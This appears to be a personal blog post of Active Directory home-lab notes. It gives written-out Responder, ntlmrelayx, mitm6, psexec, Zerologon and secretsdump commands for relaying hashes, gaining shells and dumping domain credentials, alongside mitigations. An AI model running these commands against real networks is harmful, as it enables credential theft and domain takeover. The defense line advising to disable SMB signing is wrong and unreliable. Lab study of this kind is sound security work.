---
layout: single
title: "Initial Attack Vectors in AD Environment"
date: 2024-09-23 10:00:00 +0000
categories:
  - Active Directory
tags:
  - AD
  - Attack vectors
permalink: /projects/ad-hacking-home-lab/initial-attack-vectors/
excerpt: "Recon and initial foothold: nmap, SMB shares, weak credentials, foothold."
image: "/assets/images/AD-images/AD-AV-01.jpg"
order: 1
---

# LLMNR poisoning:

LLMNR used to identify hosts when DNS failed to do so

previously NBT-NS

Keyflaw is that services utilize a user’s username and NTLMv2 hash 

### Tool:

Using responder on linux, it’s going to listen and act as a mitm and get the windows machine into giving the hash then you crack it afterwards.

# SMB Relay

instead of cracking hashes gathered using responder we can relay them to other specific machines and potentially gain access.

- SMB signing must be disabled or not enforced on the target.
- relayed user creds must be admin for real value

First check if smb is disabled or not enforced:

```jsx
nmap --script=smb2-security-mode.nse --p445 @ip
```

Second edit responder conf file and turn off smb and http then fire up responder using 

```jsx
responder -I eth0 -dwP (dP)
```

Third

```jsx
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

### Defenses:

- disable smb signing on all devices ⇒ can cause performance issues with file copies
- disable ntlm authentication on network ⇒ if kerberos stops windows will roll to ntlm automatically
- account tiering / limiting admin to specific tasks
- local admin restriction / prevent a lot of lateral movements

# Gaining a shell

### Metasploit method (gets picked up by antivirus):

- using the smb/psexec exploit you can use either a smbuser and smbpass or smbuser with its hash to gain a shell.

### Manual method (it also got picked up):

- using 3 different tools that serve the same purpose in case one of them doesn’t work.

```jsx
psexec.py RACCON/credfield:'Password1'@192.168.52.139
```

- the other tools are [wmiexec.py](http://wmiexec.py) or smbexec.py
- you can also use a hash to gain a shell


# IPv6 Attack

This attack basically takes advantage of ipv6 being turned on and not worked with, so the mitm acts like a dns for ipv6 to gain control over th DC.

- first we start the relay proxy

```jsx
sudo ntlmrelayx.py -6 -t ldaps:\\192.168.52.138 -wh fakewpad.raccoon.local -l lootme
```

- Then we start our mitm using the mitm6 tool

```jsx
sudo mitm6 -d raccoon.local
```

- now it depends either a simple reboot will trigger the attack or in my case a login so the tool sends a spoofed replay and relays the results to ntlmrelayx.
- the lootme folder has every info about the DC for any usage
- it can also create a new normal user in the DC (after listening to an administrator login) that can be taken advantage with

### Mitigation:

- IPv6 poisoning abuses the fact that windows queries for an IPV6 address even in IPv4-only environments. if you do not use IPv6 internally, the safest way to prevent mitm6 is to block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy. Disabling IPv6 entirely may have unwanted side effects. Setting the following predefined rules to block instead of Allow prevents the attack from working:
- (Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPv6)
- (Inbound) Core Networking - Router Advertisement (ICMPv6-in)
- (Outbound) Core Networking - Dynamic Host Configuration Protocol IPv6(DHCPv6- Out)
- If WPAD is not in use internally, disable it via Group Policy and by disabling the WinHttpAutoProxySvc service.
- Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP signing and LDAP channel binding.
- Consider Administrative users to the Protected Users group or marking them as Account is sensitive and cannot be delegated, which will prevent any impersonation of that user via delegation.

# Initial internal attack strategy

- Begin with mitm6 or Responder
- Run scans to generate traffic
- If scans are taking too long, look for websites in scope (http_version)
- Look for default credentials on web logins (Printers, Jenkins, etc )
- Think outside the box
- Enumeration is the most essential step we have to gather as much information as we can.
- It’s okay to ask for a user to be created for us instead of leaving with nothing to hack.

# Additional attacks

## Zerologon attack :

- It’s a dangerous attack that could destroy a domain controller if not pulled off correctly.
- SecuraBV ZeroLogon Checker - https://github.com/SecuraBV/CVE-2020-1472
- dirkjanm CVE-2020-1472 - https://github.com/dirkjanm/CVE-2020-1472

```powershell
python3 exploit.py UMBRELLA-DC 192.168.52.138
```

![eg-01](/assets/images/AD-images/AD-AV-01.jpg)

- We can now dump the hashes using secretsdump

```powershell
secretsdump.py -just-dc RACCOON/UMBRELLA-DC\$@192.168.52.138
```

- And this will dump all hashes.
- To restore the domain controller, we copy the plain text password hex using the administrator hash using secretsdump.

```powershell
python3 restorepassword.py RACCOON/UMBRELLA-DC@YMBRELLA-DC -target-ip 192.168.52.138 -hexpass thehexpass
```

![eg-02](/assets/images/AD-images/AD-AV-02.jpg)